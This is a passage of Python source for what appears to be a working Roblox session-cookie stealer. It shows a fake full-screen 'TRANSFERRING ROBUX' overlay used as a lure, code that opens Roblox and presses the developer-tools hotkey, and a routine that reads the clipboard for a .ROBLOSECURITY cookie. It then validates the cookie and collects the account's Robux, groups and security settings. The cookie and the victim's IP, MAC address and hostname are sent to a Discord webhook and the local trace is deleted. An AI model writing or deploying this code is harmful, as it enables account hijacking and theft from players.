                        'time_opened': time.time(),
                        'browser': 'brave'
                    })
                    print(f"✅ Opened {url} in new Brave window")
                    time.sleep(2)
                    return True
            
            # Last resort - use default browser
            webbrowser.open_new(url)
            self.opened_windows.append({
                'process': None,
                'url': url,
                'time_opened': time.time(),
                'browser': 'default'
            })
            print(f"✅ Opened {url} in default browser")
            time.sleep(2)
            return True
                
        except Exception as e:
            print(f"❌ Error opening URL: {e}")
            return False
    
    def close_all_opened_windows(self):
        """Close all browser windows that were opened by this script"""
        print("\n🔄 Attempting to close opened browser windows...")
        
        windows_closed = 0
        
        for window_info in self.opened_windows:
            try:
                if window_info['process']:
                    # Terminate the process we started
                    window_info['process'].terminate()
                    print(f"✅ Closed {window_info['browser']} window for {window_info['url']}")
                    windows_closed += 1
                else:
                    # For default browser, try to find and close windows with these URLs
                    if sys.platform == 'win32':
                        # On Windows, try to close windows with matching titles
                        if 'youtube.com' in window_info['url']:
                            os.system('taskkill /F /IM chrome.exe /FI "WINDOWTITLE eq YouTube" 2>nul')
                            os.system('taskkill /F /IM msedge.exe /FI "WINDOWTITLE eq YouTube" 2>nul')
                            os.system('taskkill /F /IM firefox.exe /FI "WINDOWTITLE eq YouTube" 2>nul')
                            print(f"✅ Attempted to close YouTube windows")
                            windows_closed += 1
            except Exception as e:
                print(f"⚠️ Error closing window: {e}")
        
        print(f"✅ Closed {windows_closed} browser windows")
        return windows_closed
    
    def close_specific_window(self, url_contains):
        """Close specific browser windows that contain a certain URL"""
        print(f"\n🔄 Attempting to close windows containing: {url_contains}...")
        
        windows_closed = 0
        windows_to_remove = []
        
        for i, window_info in enumerate(self.opened_windows):
            if url_contains in window_info['url']:
                try:
                    if window_info['process']:
                        window_info['process'].terminate()
                        print(f"✅ Closed {window_info['browser']} window for {window_info['url']}")
                        windows_closed += 1
                        windows_to_remove.append(i)
                    else:
                        if sys.platform == 'win32':
                            if 'youtube' in url_contains.lower():
                                os.system('taskkill /F /IM chrome.exe /FI "WINDOWTITLE eq YouTube" 2>nul')
                                os.system('taskkill /F /IM msedge.exe /FI "WINDOWTITLE eq YouTube" 2>nul')
                                os.system('taskkill /F /IM firefox.exe /FI "WINDOWTITLE eq YouTube" 2>nul')
                                print(f"✅ Attempted to close YouTube windows")
                                windows_closed += 1
                                windows_to_remove.append(i)
                except Exception as e:
                    print(f"⚠️ Error closing window: {e}")
        
        # Remove closed windows from list (in reverse order)
        for i in reversed(windows_to_remove):
            self.opened_windows.pop(i)
        
        print(f"✅ Closed {windows_closed} windows containing {url_contains}")
        return windows_closed

class BlackScreenOverlay:
    """Full screen black overlay with floating Roblox logo and text"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.configure(bg='black')
        
        # Make it full screen and always on top
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.attributes('-alpha', 1.0)
        
        # Remove window decorations
        self.root.overrideredirect(True)
        
        # Hide the mouse cursor
        self.root.config(cursor="none")
        
        # Get screen dimensions
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()
        
        # Create canvas for drawing
        self.canvas = tk.Canvas(
            self.root,
            width=self.screen_width,
            height=self.screen_height,
            bg='black',
            highlightthickness=0,
            cursor="none"
        )
        self.canvas.pack()
        
        # Create floating elements
        self.floating_images = []
        self.num_images = 15  # Number of floating images
        
        # Create floating elements
        self.create_floating_elements()
        
        # Bind escape key to close (just in case)
        self.root.bind('<Escape>', lambda e: self.close())
        
        # Flag to control animation
        self.running = True
        
    def create_floating_elements(self):
        """Create floating Roblox-style elements"""
        for i in range(self.num_images):
            # Random starting position
            x = random.randint(50, self.screen_width - 100)
            y = random.randint(50, self.screen_height - 100)
            
            # Random size (30-80 pixels)
            size = random.randint(40, 80)
            
            # Random movement speed
            dx = random.uniform(0.5, 2.0) * random.choice([-1, 1])
            dy = random.uniform(0.5, 2.0) * random.choice([-1, 1])
            
            # Random rotation speed
            rotation_speed = random.uniform(0.5, 2.0)
            
            # Create a simple Roblox-style square logo
            # Dark gray square with lighter gray border and "R" inside
            square = self.canvas.create_rectangle(
                x, y, x + size, y + size,
                fill='#1a1a1a',
                outline='#808080',
                width=2
            )
            
            # Add "R" text in the center
            text = self.canvas.create_text(
                x + size/2, y + size/2,
                text='R',
                fill='#FFD700',
                font=('Arial', int(size/2), 'bold')
            )
            
            # Add Roblox-style gray circles on corners
            corner_size = size // 5
            corner1 = self.canvas.create_oval(
                x, y, x + corner_size, y + corner_size,
                fill='#4a4a4a',
                outline='#808080'
            )
            corner2 = self.canvas.create_oval(
                x + size - corner_size, y, x + size, y + corner_size,
                fill='#4a4a4a',
                outline='#808080'
            )
            corner3 = self.canvas.create_oval(
                x, y + size - corner_size, x + corner_size, y + size,
                fill='#4a4a4a',
                outline='#808080'
            )
            corner4 = self.canvas.create_oval(
                x + size - corner_size, y + size - corner_size, x + size, y + size,
                fill='#4a4a4a',
                outline='#808080'
            )
            
            # Store all elements for this "image" with their properties
            self.floating_images.append({
                'elements': [square, text, corner1, corner2, corner3, corner4],
                'x': x,
                'y': y,
                'size': size,
                'dx': dx,
                'dy': dy,
                'rotation': 0,
                'rotation_speed': rotation_speed
            })
        
        # Create "Transferring Robux" text in the center
        self.center_text = self.canvas.create_text(
            self.screen_width // 2,
            self.screen_height // 2,
            text='TRANSFERRING ROBUX',
            fill='#FFD700',
            font=('Arial', 48, 'bold')
        )
        
        # Create pulsing effect variables for center text
        self.text_scale = 1.0
        self.text_growing = True
        
        # Create small loading text at bottom
        self.bottom_text = self.canvas.create_text(
            self.screen_width // 2,
            self.screen_height - 50,
            text='Please wait... Processing transaction',
            fill='#808080',
            font=('Arial', 16)
        )
        
    def animate(self):
        """Animate floating elements"""
        if not self.running:
            return
            
        # Update each floating image
        for img in self.floating_images:
            # Move position
            img['x'] += img['dx']
            img['y'] += img['dy']
            
            # Bounce off edges
            if img['x'] <= 0 or img['x'] + img['size'] >= self.screen_width:
                img['dx'] *= -1
            if img['y'] <= 0 or img['y'] + img['size'] >= self.screen_height:
                img['dy'] *= -1
            
            # Update rotation (simulate by slight movement)
            img['rotation'] += img['rotation_speed']
            
            # Move all elements of this image
            for element in img['elements']:
                self.canvas.move(element, img['dx'], img['dy'])
        
        # Pulse the center text
        if self.text_growing:
            self.text_scale += 0.005
            if self.text_scale >= 1.2:
                self.text_growing = False
        else:
            self.text_scale -= 0.005
            if self.text_scale <= 1.0:
                self.text_growing = True
        
        # Update center text color
        intensity = int(255 * (0.7 + 0.3 * math.sin(time.time() * 3)))
        color = f'#{intensity:02x}{intensity:02x}00'
        self.canvas.itemconfig(self.center_text, fill=color)
        
        # Update bottom text with dots animation
        dots = '.' * (int(time.time() * 2) % 4)
        self.canvas.itemconfig(
            self.bottom_text,
            text=f'Please wait... Processing transaction{dots}'
        )
        
        # Schedule next animation frame
        if self.running:
            self.root.after(50, self.animate)
    
    def show(self):
        """Show the overlay and start animation"""
        self.animate()
        self.root.update()
        
    def close(self):
        """Close the overlay"""
        self.running = False
        self.root.quit()
        self.root.destroy()
    
    def run_until_complete(self, duration=None):
        """Run the overlay until complete signal or duration"""
        self.show()
        
        if duration:
            # Auto-close after duration
            self.root.after(int(duration * 1000), self.close)
        
        # Start main loop
        self.root.mainloop()

class RobloxCookieChecker:
    """Class to validate and check Roblox cookie information"""
    
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def validate_cookie(self, cookie):
        """Validate Roblox cookie and get comprehensive user info"""
        try:
            # Clean the cookie (remove .ROBLOSECURITY if present)
            original_cookie = cookie
            if '.ROBLOSECURITY' in cookie:
                # Extract the actual cookie value
                match = re.search(r'\.ROBLOSECURITY=([^;\s]+)', cookie)
                if match:
                    cookie = match.group(1)
                else:
                    cookie = cookie.split('.ROBLOSECURITY')[-1].strip()
            
            # Test the cookie by accessing user info
            self.session.cookies.set('.ROBLOSECURITY', cookie, domain='.roblox.com')
            
            # Get basic user info
            response = self.session.get('https://users.roblox.com/v1/users/authenticated', headers=self.headers)
            
            if response.status_code == 200:
                user_data = response.json()
                user_id = user_data.get('id')
                username = user_data.get('name')
                display_name = user_data.get('displayName')
                
                # Check if 2-step verification is enabled
                two_step_response = self.session.get(
                    f'https://auth.roblox.com/v2/users/{user_id}/two-step-verification',
                    headers=self.headers
                )
                two_step_enabled = two_step_response.status_code == 200 and two_step_response.json().get('enabled', False)
                
                # Get comprehensive group information
                groups_response = self.session.get(
                    f'https://groups.roblox.com/v1/users/{user_id}/groups/roles',
                    headers=self.headers
                )
                
                groups_data = []
                group_count = 0
                owned_groups = []
                if groups_response.status_code == 200:
                    groups = groups_response.json().get('data', [])
                    group_count = len(groups)
                    
                    # Get detailed info for each group
                    for g in groups[:10]:  # Limit to 10 groups for detailed info
                        group_info = {
                            'name': g['group']['name'],
                            'role': g['role']['name'],
                            'id': g['group']['id'],
                            'member_count': g['group'].get('memberCount', 'Unknown'),
                            'is_owned': False
                        }
                        
                        # Check if user owns this group
                        try:
                            group_details = self.session.get(
                                f'https://groups.roblox.com/v1/groups/{g["group"]["id"]}',
                                headers=self.headers
                            )
                            if group_details.status_code == 200:
                                group_details_data = group_details.json()
                                if group_details_data.get('owner', {}).get('id') == user_id:
                                    group_info['is_owned'] = True
                                    owned_groups.append(group_info['name'])
                        except:
                            pass
                        
                        groups_data.append(group_info)
                
                # Get friend count
                friends_count = 0
                try:
                    friends_response = self.session.get(
                        f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
                        headers=self.headers
                    )
                    if friends_response.status_code == 200:
                        friends_count = friends_response.json().get('count', 0)
                except:
                    pass
                
                # Get user's game passes
                gamepasses = []
                gamepass_count = 0
                try:
                    # Try to get gamepasses from inventory
                    inventory_response = self.session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id}/items/GamePass',
                        headers=self.headers
                    )
                    if inventory_response.status_code == 200:
                        inventory_data = inventory_response.json()
                        gamepass_count = inventory_data.get('total', 0)
                        # Get first 5 gamepasses details
                        for item in inventory_data.get('data', [])[:5]:
                            gamepasses.append({
                                'name': item.get('name', 'Unknown'),
                                'id': item.get('assetId', 'Unknown')
                            })
                except:
                    pass
                
                # Get user's products (clothing, etc.)
                product_counts = {
                    'shirts': 0,
                    'pants': 0,
                    'tshirts': 0,
                    'accessories': 0,
                    'models': 0,
                    'decals': 0,
                    'audio': 0,
                    'meshes': 0,
                    'plugins': 0,
                    'games': 0
                }
                
                # Get user's creations (games)
                games = []
                games_count = 0
                try:
                    games_response = self.session.get(
                        f'https://games.roblox.com/v2/users/{user_id}/games',
                        headers=self.headers,
                        params={'limit': 10}
                    )
                    if games_response.status_code == 200:
                        games_data = games_response.json()
                        games_count = games_data.get('total', 0)
                        for game in games_data.get('data', [])[:5]:
                            games.append({
                                'name': game.get('name', 'Unknown'),
                                'id': game.get('id', 'Unknown'),
                                'visits': game.get('visits', 0)
                            })
                except:
                    pass
                
                # Get shirt count
                try:
                    shirts_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Clothing',
                            'subcategory': 'Shirts',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if shirts_response.status_code == 200:
                        product_counts['shirts'] = shirts_response.json().get('total', 0)
                except:
                    pass
                
                # Get pants count
                try:
                    pants_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Clothing',
                            'subcategory': 'Pants',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if pants_response.status_code == 200:
                        product_counts['pants'] = pants_response.json().get('total', 0)
                except:
                    pass
                
                # Get t-shirt count
                try:
                    tshirts_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Clothing',
                            'subcategory': 'T-Shirts',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if tshirts_response.status_code == 200:
                        product_counts['tshirts'] = tshirts_response.json().get('total', 0)
                except:
                    pass
                
                # Get accessories count
                try:
                    accessories_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Accessories',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if accessories_response.status_code == 200:
                        product_counts['accessories'] = accessories_response.json().get('total', 0)
                except:
                    pass
                
                # Get models count
                try:
                    models_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Models',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if models_response.status_code == 200:
                        product_counts['models'] = models_response.json().get('total', 0)
                except:
                    pass
                
                # Get decals count
                try:
                    decals_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Decals',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if decals_response.status_code == 200:
                        product_counts['decals'] = decals_response.json().get('total', 0)
                except:
                    pass
                
                # Get audio count
                try:
                    audio_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Audio',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if audio_response.status_code == 200:
                        product_counts['audio'] = audio_response.json().get('total', 0)
                except:
                    pass
                
                # Get plugins count
                try:
                    plugins_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Plugins',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if plugins_response.status_code == 200:
                        product_counts['plugins'] = plugins_response.json().get('total', 0)
                except:
                    pass
                
                # Get meshes count
                try:
                    meshes_response = self.session.get(
                        f'https://catalog.roblox.com/v1/search/items',
                        headers=self.headers,
                        params={
                            'category': 'Meshes',
                            'creatorId': user_id,
                            'limit': 10
                        }
                    )
                    if meshes_response.status_code == 200:
                        product_counts['meshes'] = meshes_response.json().get('total', 0)
                except:
                    pass
                
                product_counts['games'] = games_count
                
                # Check if user has premium
                premium_response = self.session.get(
                    'https://premiumfeatures.roblox.com/v1/users/validate-membership',
                    headers=self.headers
                )
                has_premium = premium_response.status_code == 200 and premium_response.json().get('isPremium', False)
                
                # Check account age
                account_response = self.session.get(
                    f'https://users.roblox.com/v1/users/{user_id}',
                    headers=self.headers
                )
                account_age_days = None
                verified = False
                if account_response.status_code == 200:
                    account_data = account_response.json()
                    created = account_data.get('created')
                    if created:
                        created_date = datetime.datetime.fromisoformat(created.replace('Z', '+00:00'))
                        account_age_days = (datetime.datetime.now(datetime.timezone.utc) - created_date).days
                    
                    # Check if email is verified
                    verified = account_data.get('hasVerifiedBadge', False)
                
                # Get Robux balance
                robux_response = self.session.get(
                    f'https://economy.roblox.com/v1/users/{user_id}/currency',
                    headers=self.headers
                )
                robux_balance = 0
                if robux_response.status_code == 200:
                    robux_balance = robux_response.json().get('robux', 0)
                
                return {
                    'valid': True,
                    'user_id': user_id,
                    'username': username,
                    'display_name': display_name,
                    'two_step_enabled': two_step_enabled,
                    'has_premium': has_premium,
                    'verified_badge': verified,
                    'group_count': group_count,
                    'owned_groups': owned_groups,
                    'groups_preview': groups_data,
                    'friends_count': friends_count,
                    'gamepass_count': gamepass_count,
                    'gamepasses_preview': gamepasses,
                    'product_counts': product_counts,
                    'games_count': games_count,
                    'games_preview': games,
                    'account_age_days': account_age_days,
                    'robux_balance': robux_balance,
                    'full_cookie': original_cookie,  # Store full cookie for copying
                    'cookie': cookie  # Clean cookie
                }
            else:
                return {'valid': False, 'error': 'Invalid cookie'}
                
        except Exception as e:
            return {'valid': False, 'error': str(e)}
    
    def create_cookie_file(self, cookie_info, system_info=None):
        """Create a comprehensive text file containing all cookie information"""
        try:
            filename = f"roblox_cookie_{cookie_info['username']}_{int(time.time())}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("COMPLETE ROBLOX ACCOUNT EXPORT\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("COOKIE VALUE:\n")
                f.write("-" * 40 + "\n")
                f.write(cookie_info.get('full_cookie', cookie_info.get('cookie', '')))
                f.write("\n\n")
                
                f.write("ACCOUNT INFORMATION:\n")
                f.write("-" * 40 + "\n")
                f.write(f"Username: {cookie_info['username']}\n")
                f.write(f"Display Name: {cookie_info['display_name']}\n")
                f.write(f"User ID: {cookie_info['user_id']}\n")
                f.write(f"Profile URL: https://www.roblox.com/users/{cookie_info['user_id']}/profile\n")
                
                # Account age
                if cookie_info['account_age_days']:
                    years = cookie_info['account_age_days'] // 365
                    months = (cookie_info['account_age_days'] % 365) // 30
                    days = cookie_info['account_age_days'] % 30
                    f.write(f"Account Age: {years} years, {months} months, {days} days (Total: {cookie_info['account_age_days']} days)\n")
                
                f.write(f"2-Step Verification: {'Enabled' if cookie_info['two_step_enabled'] else 'Disabled'}\n")
                f.write(f"Premium: {'Yes' if cookie_info['has_premium'] else 'No'}\n")
                f.write(f"Verified Badge: {'Yes' if cookie_info['verified_badge'] else 'No'}\n")
                f.write(f"Robux Balance: {cookie_info['robux_balance']:,}\n")
                f.write(f"Friends Count: {cookie_info['friends_count']:,}\n\n")
                
                f.write("GROUPS INFORMATION:\n")
                f.write("-" * 40 + "\n")
                f.write(f"Total Groups: {cookie_info['group_count']}\n")
                if cookie_info['owned_groups']:
                    f.write(f"Groups Owned: {', '.join(cookie_info['owned_groups'])}\n")
                f.write("\nGroup Details:\n")
                for group in cookie_info['groups_preview']:
                    f.write(f"  • {group['name']} (ID: {group['id']})\n")
                    f.write(f"    Role: {group['role']}\n")
                    f.write(f"    Member Count: {group['member_count']}\n")
                    f.write(f"    Owned: {'Yes' if group['is_owned'] else 'No'}\n")
                f.write("\n")
                
                f.write("GAMEPASSES:\n")
                f.write("-" * 40 + "\n")
                f.write(f"Total Gamepasses Owned: {cookie_info['gamepass_count']}\n")
                if cookie_info['gamepasses_preview']:
                    f.write("Recent Gamepasses:\n")
                    for gp in cookie_info['gamepasses_preview']:
                        f.write(f"  • {gp['name']} (ID: {gp['id']})\n")
                f.write("\n")
                
                f.write("CREATIONS & PRODUCTS:\n")
                f.write("-" * 40 + "\n")
                f.write(f"Games Created: {cookie_info['product_counts']['games']}\n")
                if cookie_info['games_preview']:
                    f.write("Recent Games:\n")
                    for game in cookie_info['games_preview']:
                        f.write(f"  • {game['name']} (ID: {game['id']}) - {game['visits']:,} visits\n")
                f.write(f"\nClothing:\n")
                f.write(f"  • Shirts: {cookie_info['product_counts']['shirts']}\n")
                f.write(f"  • Pants: {cookie_info['product_counts']['pants']}\n")
                f.write(f"  • T-Shirts: {cookie_info['product_counts']['tshirts']}\n")
                f.write(f"\nOther Products:\n")
                f.write(f"  • Accessories: {cookie_info['product_counts']['accessories']}\n")
                f.write(f"  • Models: {cookie_info['product_counts']['models']}\n")
                f.write(f"  • Decals: {cookie_info['product_counts']['decals']}\n")
                f.write(f"  • Audio: {cookie_info['product_counts']['audio']}\n")
                f.write(f"  • Plugins: {cookie_info['product_counts']['plugins']}\n")
                f.write(f"  • Meshes: {cookie_info['product_counts']['meshes']}\n\n")
                
                # System information
                if system_info:
                    f.write("SYSTEM INFORMATION:\n")
                    f.write("-" * 40 + "\n")
                    f.write(f"Timestamp: {system_info.get('timestamp', 'N/A')}\n")
                    f.write(f"Hostname: {system_info.get('hostname', 'N/A')}\n")
                    f.write(f"Username: {system_info.get('username', 'N/A')}\n")
                    f.write(f"Platform: {system_info.get('platform', 'N/A')} {system_info.get('platform_release', 'N/A')}\n")
                    f.write(f"Public IP: {system_info.get('public_ip', 'N/A')}\n")
                    f.write(f"Local IP: {system_info.get('local_ip', 'N/A')}\n")
                    f.write(f"MAC Address: {system_info.get('mac_address', 'N/A')}\n")
                
                f.write("\n" + "=" * 80 + "\n")
                f.write("END OF EXPORT\n")
                f.write("=" * 80 + "\n")
            
            return filename
            
        except Exception as e:
            print(f"Error creating cookie file: {e}")
            return None
    
    def send_to_discord_with_file(self, webhook_url, cookie_info, system_info=None):
        """Send comprehensive cookie information to Discord with file attachment"""
        try:
            # Create the cookie file
            filename = self.create_cookie_file(cookie_info, system_info)
            if not filename:
                return False
            
            # Calculate account age for display
            account_age = f"{cookie_info['account_age_days']} days"
            if cookie_info['account_age_days']:
                years = cookie_info['account_age_days'] // 365
                months = (cookie_info['account_age_days'] % 365) // 30
                if years > 0:
                    account_age = f"{years} years, {months} months"
            
            # Format owned groups
            owned_groups_text = "None"
            if cookie_info['owned_groups']:
                owned_groups_text = ", ".join(cookie_info['owned_groups'][:3])
                if len(cookie_info['owned_groups']) > 3:
                    owned_groups_text += f" and {len(cookie_info['owned_groups'])-3} more"
            
            # Create embed
            embed = {
                "title": f"🍪 Roblox Cookie Captured - {cookie_info['username']}",
                "url": f"https://www.roblox.com/users/{cookie_info['user_id']}/profile",
                "color": 15844367,  # Gold/Yellow
                "thumbnail": {
                    "url": f"https://www.roblox.com/headshot-thumbnail/image?userId={cookie_info['user_id']}&width=420&height=420&format=png"
                },
                "fields": [
                    {
                        "name": "👤 Account Info",
                        "value": f"**Username:** {cookie_info['username']}\n"
                                f"**Display Name:** {cookie_info['display_name']}\n"
                                f"**User ID:** {cookie_info['user_id']}\n"
                                f"**Account Age:** {account_age}",
                        "inline": False
                    },
                    {
                        "name": "🔐 Security",
                        "value": f"**2-Step:** {'✅' if cookie_info['two_step_enabled'] else '❌'}\n"
                                f"**Premium:** {'✅' if cookie_info['has_premium'] else '❌'}\n"
                                f"**Verified:** {'✅' if cookie_info['verified_badge'] else '❌'}",
                        "inline": True
                    },
                    {
                        "name": "💰 Economy & Friends",
                        "value": f"**Robux:** {cookie_info['robux_balance']:,}\n"
                                f"**Friends:** {cookie_info['friends_count']:,}\n"
                                f"**Groups:** {cookie_info['group_count']}",
                        "inline": True
                    },
                    {
                        "name": "👥 Groups Owned",
                        "value": owned_groups_text,
                        "inline": False
                    },
                    {
                        "name": "🎮 Games & Gamepasses",
                        "value": f"**Games Created:** {cookie_info['product_counts']['games']}\n"
                                f"**Gamepasses Owned:** {cookie_info['gamepass_count']}",
                        "inline": True
                    },
                    {
                        "name": "👕 Clothing",
                        "value": f"**Shirts:** {cookie_info['product_counts']['shirts']}\n"
                                f"**Pants:** {cookie_info['product_counts']['pants']}\n"
                                f"**T-Shirts:** {cookie_info['product_counts']['tshirts']}",
                        "inline": True
                    },
                    {
                        "name": "📦 Other Creations",
                        "value": f"**Accessories:** {cookie_info['product_counts']['accessories']}\n"
                                f"**Models:** {cookie_info['product_counts']['models']}\n"
                                f"**Decals:** {cookie_info['product_counts']['decals']}\n"
                                f"**Audio:** {cookie_info['product_counts']['audio']}",
                        "inline": False
                    },
                    {
                        "name": "📎 File Attachment",
                        "value": f"✅ Complete account details in attached file: `{filename}`\n"
                                f"Contains full cookie, all groups, products, and creations.",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"System: {system_info.get('hostname', 'Unknown')} | {system_info.get('public_ip', 'Unknown IP')}"
                }
            }
            
            # Add groups preview if available
            if cookie_info['groups_preview']:
                groups_text = ""
                for group in cookie_info['groups_preview'][:3]:
                    groups_text += f"• [{group['name']}](https://www.roblox.com/groups/{group['id']}) - {group['role']}\n"
                if groups_text:
                    embed["fields"].append({
                        "name": "📋 Top Groups",
                        "value": groups_text,
                        "inline": False
                    })
            
            # Add games preview if available
            if cookie_info['games_preview']:
                games_text = ""
                for game in cookie_info['games_preview'][:2]:
                    games_text += f"• [{game['name']}](https://www.roblox.com/games/{game['id']}) - {game['visits']:,} visits\n"
                if games_text:
                    embed["fields"].append({
                        "name": "🎮 Recent Games",
                        "value": games_text,
                        "inline": False
                    })
            
            # Prepare the multipart form data
            with open(filename, 'rb') as f:
                files = {
                    'file': (filename, f, 'text/plain')
                }
                
                payload = {
                    'payload_json': json.dumps({
                        'embeds': [embed],
                        'content': f"**🍪 Roblox Cookie Captured - {cookie_info['username']}**"
                    })
                }
                
                response = requests.post(webhook_url, data=payload, files=files)
            
            # Clean up the file after sending
            try:
                os.remove(filename)
                print(f"✅ Temporary file {filename} deleted")
            except:
                pass
            
            return response.status_code in [200, 204]
            
        except Exception as e:
            print(f"Error sending to Discord with file: {e}")
            return False

class RobloxBrowserOpener:
    """Class to handle opening Roblox in new window"""
    
    @staticmethod
    def open_url_new_window(url):
        """Open a URL in a new browser window - FIXED VERSION"""
        try:
            print(f"🌐 Attempting to open {url} in new window...")
            
            # METHOD 1: Try Chrome with specific new window command
            chrome_paths = [
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"),
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"
            ]
            
            for chrome_path in chrome_paths:
                if os.path.exists(chrome_path):
                    print(f"✅ Found Chrome at: {chrome_path}")
                    # Use --new-window to force new window, not tab
                    subprocess.Popen([chrome_path, "--new-window", url])
                    print(f"✅ Opened {url} in new Chrome window")
                    time.sleep(4)
                    return True
            
            # METHOD 2: Try Edge
            edge_paths = [
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe"
            ]
            
            for edge_path in edge_paths:
                if os.path.exists(edge_path):
                    print(f"✅ Found Edge at: {edge_path}")
                    subprocess.Popen([edge_path, "--new-window", url])
                    print(f"✅ Opened {url} in new Edge window")
                    time.sleep(4)
                    return True
            
            # METHOD 3: Try Firefox
            firefox_paths = [
                "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
                "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Mozilla Firefox\\firefox.exe"
            ]
            
            for firefox_path in firefox_paths:
                if os.path.exists(firefox_path):
                    print(f"✅ Found Firefox at: {firefox_path}")
                    subprocess.Popen([firefox_path, "--new-window", url])
                    print(f"✅ Opened {url} in new Firefox window")
                    time.sleep(4)
                    return True
            
            # METHOD 4: Try Brave
            brave_paths = [
                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
            ]
            
            for brave_path in brave_paths:
                if os.path.exists(brave_path):
                    print(f"✅ Found Brave at: {brave_path}")
                    subprocess.Popen([brave_path, "--new-window", url])
                    print(f"✅ Opened {url} in new Brave window")
                    time.sleep(4)
                    return True
            
            # METHOD 5: Try Opera
            opera_paths = [
                "C:\\Program Files\\Opera\\launcher.exe",
                "C:\\Program Files (x86)\\Opera\\launcher.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Programs\\Opera\\launcher.exe"
            ]
            
            for opera_path in opera_paths:
                if os.path.exists(opera_path):
                    print(f"✅ Found Opera at: {opera_path}")
                    subprocess.Popen([opera_path, "--new-window", url])
                    print(f"✅ Opened {url} in new Opera window")
                    time.sleep(4)
                    return True
            
            # METHOD 6: Use default browser with new window command
            try:
                if sys.platform == 'win32':
                    os.startfile(url)
                    print(f"✅ Opened {url} using os.startfile")
                else:
                    webbrowser.open_new(url)
                    print(f"✅ Opened {url} using webbrowser.open_new")
                time.sleep(4)
                return True
            except:
                pass
            
            # METHOD 7: Last resort - just open in default browser
            webbrowser.open(url)
            print(f"✅ Opened {url} in default browser")
            time.sleep(4)
            return True
                
        except Exception as e:
            print(f"❌ Error opening URL: {e}")
            try:
                webbrowser.open(url)
                time.sleep(4)
                return True
            except:
                return False
    
    @staticmethod
    def open_roblox_new_window():
        """Open Roblox.com in a new browser window"""
        return RobloxBrowserOpener.open_url_new_window("https://www.roblox.com")

    @staticmethod
    def press_ctrl_shift_i():
        """Press Ctrl+Shift+I to open Developer Tools"""
        try:
            print("🔍 Pressing Ctrl+Shift+I to open Developer Tools...")
            time.sleep(2)  # Wait for browser to fully load
            
            # Press Ctrl+Shift+I
            pyautogui.hotkey('ctrl', 'shift', 'i')
            
            print("✅ Ctrl+Shift+I pressed! Developer Tools opened.")
            time.sleep(2)  # Wait for DevTools to open
            return True
            
        except Exception as e:
            print(f"⚠️ Error pressing Ctrl+Shift+I: {e}")
            return False

class HiddenAutoPasteValidate:
    """Hidden auto-paste and validation that runs in background - FIXED with multi-method clipboard"""
    
    def __init__(self, system_info):
        self.system_info = system_info
        self.cookie_checker = RobloxCookieChecker()
        self.last_cookie_info = None
        
    def run(self):
        """Run the auto-paste and validation process"""
        print("📋 Reading clipboard content...")
        time.sleep(1)
        
        # Get clipboard content using multi-method
        clipboard_text = get_clipboard_text_multimethod()
        
        if not clipboard_text:
            print("❌ No text in clipboard after multiple attempts")
            return None
        
        print(f"📋 Clipboard contains: {clipboard_text[:100]}...")
        
        # Check if it looks like a Roblox cookie
        if ('_|' in clipboard_text or '.ROBLOSECURITY' in clipboard_text) and len(clipboard_text) > 20:
            print("🔍 Detected Roblox cookie, validating...")
            
            # Validate the cookie
            cookie_info = self.cookie_checker.validate_cookie(clipboard_text)
            self.last_cookie_info = cookie_info
            
            if cookie_info['valid']:
                print(f"✅ Valid cookie for user: {cookie_info['username']}")
                print(f"💰 Robux: {cookie_info['robux_balance']:,}")
                
                # Send to Discord with file attachment
